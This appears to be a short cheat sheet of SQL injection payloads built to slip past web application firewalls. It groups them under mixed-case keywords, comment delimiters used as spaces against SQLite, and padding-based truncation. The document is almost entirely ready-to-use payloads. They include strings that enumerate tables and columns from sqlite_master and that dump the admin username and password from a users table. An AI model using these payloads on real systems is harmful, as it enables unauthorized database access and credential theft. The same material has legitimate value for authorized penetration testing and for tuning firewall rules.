# SQLi WAF Bypass Techniques

### 1) Mixed cases

' OR 1=1--

    ' oR tRue--

Column enumeration

    ' UniON sEleCt 1,2,3--

### 2) White Space and Delimiters

#### SQL: SQLite

Enumerate columns of the current database

    '/**/uNion/**/sElect/**/1,2,3,4;--

Enumerate table names

    '/**/uNion/**/sElect/**/1,2,name,4 FROM sqlite_master WHERE type='table';--

Enumerate column names of a database

    '/**/uNion/**/sElect/**/1,2,sql,4 FROM sqlite_master WHERE name='users';--

Dump data from a database

    '/**/uNion/**/sElect/**/username,password,3,4/**/FROM/**/users/**/WHERE/**/username='admin';--

### 3) SQL Truncation

The number of pad characters depends on the WAF rule set

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' union select 1,2,3,4,5--
